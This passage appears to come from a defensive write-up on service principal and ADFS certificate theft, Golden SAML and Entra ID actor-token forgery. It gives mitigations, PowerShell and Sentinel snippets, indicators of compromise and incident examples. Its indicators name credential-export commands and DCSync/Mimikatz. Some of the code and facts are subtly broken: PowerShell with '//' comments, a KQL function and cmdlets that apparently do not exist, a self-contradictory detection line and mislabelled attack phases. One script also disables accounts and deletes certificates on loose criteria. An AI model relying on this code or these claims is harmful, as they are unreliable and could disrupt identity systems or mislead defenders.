3. Ensure only authorized admins are owners (limit to <5 people)
4. Create Conditional Access policy:
   - Restrict who can modify app credentials to specific admin accounts
   - Require approval for "Add keyCredentials" operations

**PowerShell:**

```powershell
# Audit all service principals with certificates
Get-MgServicePrincipal -Filter "startsWith(displayName, 'Exchange') or startsWith(displayName, 'Hybrid')" |
    ForEach-Object {
        if ($_.KeyCredentials.Count -gt 0) {
            Write-Host "WARNING: $($_.DisplayName) has $($_.KeyCredentials.Count) certificates"
            Write-Host "Owner(s): $((Get-MgServicePrincipalOwner -ServicePrincipalId $_.Id).UserPrincipalName -join ', ')"
        }
    }
```

---

**4. Implement Actor Token Detection & Response Automation**

Detect and block suspicious S2S actor token usage in real-time.

**Manual Steps:**

1. Deploy Sentinel detection rules (see Section 8).
2. Configure automated response:
   - Revoke service principal credentials immediately.
   - Disable service principal sign-in.
   - Alert security team.

**PowerShell Automation:**

```powershell
# Automated response to actor token abuse
$suspiciousSPs = Get-MgServicePrincipal -Filter "startsWith(displayName, 'Exchange')" |
    Where-Object { $_.KeyCredentials.Count -gt 3 }  // Unusual number of certs

$suspiciousSPs | ForEach-Object {
    Write-Host "CRITICAL: Service principal $($_.DisplayName) has suspicious credentials"
    
    # Disable the service principal
    Update-MgServicePrincipal -ServicePrincipalId $_.Id -AccountEnabled $false
    
    # Remove all certificates
    Remove-MgServicePrincipalKeyCredential -ServicePrincipalId $_.Id -KeyId ($_.KeyCredentials.KeyId)
}
```

---

### Priority 2: HIGH

**5. Enable Certificate-Based Authentication with Device Binding**

CBA adds phishing-resistant authentication but must include device compliance.

**Manual Steps:**

1. Go to **Azure Portal** → **Entra ID** → **Authentication methods** → **Certificate-based authentication**
2. Enable CBA for privileged users
3. Configure binding rule:
   - Issuer Subject: Only accept certs from trusted internal CA
   - Require compliant device: **Yes**

---

**6. Monitor & Alert on keyCredentials Changes**

Every certificate addition should trigger investigation.

**Detection Query (Sentinel):**

```kusto
AuditLogs
| where OperationName == "Add keyCredentials" or OperationName == "Update application – Certificates and secrets"
| where TargetResources[0].displayName in ("Exchange", "Hybrid", "Sync")
| project
    TimeGenerated,
    OperationName,
    TargetResource=TargetResources[0].displayName,
    InitiatedBy=InitiatedBy.User.UserPrincipalName
| notify_operator()  // Send alert to SOC
```

---

## 14. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

**ADFS Certificate Export:**
- Event ID 1007 in Microsoft-Windows-CertificateServicesClient-Lifecycle-System
- `certutil.exe -exportPFX` in command line logs (Event ID 4688)
- `Export-PfxCertificate` in PowerShell logs (Event ID 4103/4104)

**Forged SAML/Actor Tokens:**
- SigninLogs with ADFS issuer but no corresponding ADFS server event
- Logins from non-interactive service principals accessing user mailboxes
- Exchange Online mailbox access without user interaction

**Service Principal Compromise:**
- New keyCredentials added to Exchange/Hybrid service principals
- Multiple certificates (>3) on service principal
- Certificate with >2 years validity added recently

### Forensic Artifacts

**ADFS Server:**
- Registry: HKLM\Software\Microsoft\ADFS (certificate metadata)
- Event Log: Microsoft-Windows-CertificateServicesClient-Lifecycle-System (Event 1007)
- Database: ADFS Config DB (WID/SQL) - certificate material

**Entra ID:**
- AuditLogs: "Add keyCredentials", "Update application"
- SigninLogs: Suspicious issuers, missing correlations
- MicrosoftGraphActivityLogs: Service principals accessing user mailboxes

**Exchange Online:**
- MailItemsAccessed audit log entries from service accounts
- Creation of mailbox forwarding rules without user action

### Response Procedures

1. **Isolate Compromised Certificate:**
   ```powershell
   # Revoke ADFS signing certificate
   Set-AdfsRelyingPartyTrust -TargetName "Microsoft Office 365 Identity Platform" `
       -MetadataURL "https://nexus.microsoftonline.com/federationmetadata/saml20/federationmetadata.xml" `
       -SigningCertificateNeedsUpdated:$true
   ```

2. **Disable Compromised Service Principal:**
   ```powershell
   Update-MgServicePrincipal -ServicePrincipalId "SERVICE_PRINCIPAL_ID" -AccountEnabled $false
   ```

3. **Revoke All Actor Tokens:**
   ```powershell
   # No direct revocation; must revoke underlying certificate
   Revoke-MgServicePrincipalKeyCredential -ServicePrincipalId "SERVICE_PRINCIPAL_ID" `
       -KeyId "CERTIFICATE_KEY_ID"
   ```

4. **Force Re-Authentication:**
   ```powershell
   # Revoke all refresh tokens for all users (nuclear option)
   Get-MgUser | ForEach-Object {
       Revoke-MgUserSignInSession -UserId $_.Id
   }
   ```

5. **Investigate Mailbox Access:**
   ```powershell
   # Search for suspicious mailbox access
   Search-UnifiedAuditLog -Operations "MailItemsAccessed" `
       -StartDate (Get-Date).AddDays(-30) `
       -FreeText "service account" |
       Select-Object UserIds, AuditData | Export-Csv investigation.csv
   ```

---

## 15. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [PE-VALID-001] Exchange Server ACL Abuse | Attacker gains initial compromised on-prem server |
| **2** | **Credential Access** | **[CA-TOKEN-006]** | **Service Principal Certificate Theft (this technique)** |
| **3** | **Lateral Movement** | [PE-ACCTMGMT-014] Global Administrator Backdoor | Attacker creates new admin account using stolen cert |
| **4** | **Impact** | [CA-UNSC-003] SYSVOL GPP Credential Extraction | Attacker accesses all M365 data |
| **5** | **Persistence** | [PE-ACCTMGMT-001] App Registration Permissions Escalation | Attacker registers persistent OAuth app |

---

## 16. REAL-WORLD EXAMPLES

### Example 1: SolarWinds SUNBURST - Golden SAML Attack (December 2020)

- **Target:** US Government, Fortune 500 companies
- **Timeline:** December 2020 (SolarWinds supply chain compromise)
- **Attack Method:** Compromised SolarWinds software → ADFS server access → certificate theft → Golden SAML
- **Technical Details:**
  1. Attackers compromised SolarWinds build system
  2. Injected backdoor in SolarWinds Orion software
  3. Deployed to thousands of government/enterprise customers
  4. Backdoor provided access to on-premises networks
  5. Extracted ADFS token signing certificate
  6. Forged SAML tokens to access Office 365 as any user
  7. Escalated to Global Admin and created backdoor accounts
- **Impact:** Compromised multiple US government agencies, Fortune 500 companies; persistent access for months
- **Detection Failures:** SAML tokens appeared legitimate (valid signature); no ADFS server events triggered
- **Lessons:** Golden SAML remains one of highest-impact attacks; requires comprehensive monitoring across ADFS and cloud

### Example 2: APT29 ADFS Certificate Replication Abuse (2023-2025)

- **Target:** Government agencies, NGOs, diplomatic organizations
- **Timeline:** 2023-2025 (ongoing)
- **Attack Method:** Extract DKM keys via AD replication → decrypt ADFS certificate → forge tokens
- **Technical Details:**
  1. Compromised domain user with replication rights
  2. Used "lsyncd" or "DCSync" (Mimikatz) to replicate DKM encryption keys from AD
  3. Decrypted ADFS token signing certificate with stolen DKM key
  4. Generated Golden SAML tokens to access M365
  5. Maintained persistence for 6+ months
- **Detection:** Unusual AD replication from user account (Event ID 4662); SAML logins without ADFS correlation
- **Reference:** [Google Cloud - Abusing AD FS Replication](https://cloud.google.com/blog/topics/threat-intelligence/abusing-replication-stealing-adfs-secrets-over-the-network/)

### Example 3: Actor Token Forgery - CVE-2025-55241 (July 2025)

- **Target:** Every Entra ID tenant (cross-tenant vulnerability)
- **Timeline:** July 2025 (patched 17 July 2025)
- **Attack Method:** S2S actor token signing with compromised service principal cert
- **Technical Details:**
  1. Attacker obtained service principal certificate (leaked in code repo or API compromise)
  2. Signed actor tokens impersonating Global Admin
  3. Tokens accepted by Exchange Online without Entra ID re-validation
  4. Accessed mailboxes, created admin accounts, granted OAuth app permissions
  5. Attack was cross-tenant (could compromise any organization)
- **Impact:** Every tenant potentially compromised; no password or MFA required
- **Detection:** Unsigned/malformed tokens with valid signatures (cryptographic mismatch)
- **Reference:** [SlashID - Actor Token Forgery Analysis](https://www.slashid.dev/blog/actor-token-forgery-overview/)

---

## 17. OPERATIONAL NOTES & ADDITIONAL RECOMMENDATIONS

### Why Certificate Theft Remains CRITICAL:

1. **Cryptographic Trust is Implicit:** Once cert is stolen, tokens are indistinguishable from legitimate ones.
2. **MFA is Irrelevant:** Certificate signing bypasses MFA entirely; user is already "authenticated" by cert.
3. **Persistence is Long-Term:** Certificates remain valid for years; stolen certs enable access indefinitely.
4. **Visibility is Poor:** Forged SAML tokens appear in M365 logs but origination (ADFS server) cannot be verified.

### Recommended Defensive Posture:

- **Rotate certificates frequently** (every 1-2 years max).
- **Monitor certificate additions** to service principals (every change = investigation).
- **Move away from ADFS** where possible; use native Entra ID CBA.
- **Implement device-bound certificates** (require compliant device for CBA).
- **Create playbooks** for Golden SAML detection (missing ADFS server events).
- **Audit ADFS access** ruthlessly; restrict to minimal staff.
- **Use Hardware Security Modules (HSM)** for certificate storage (makes extraction harder).

---
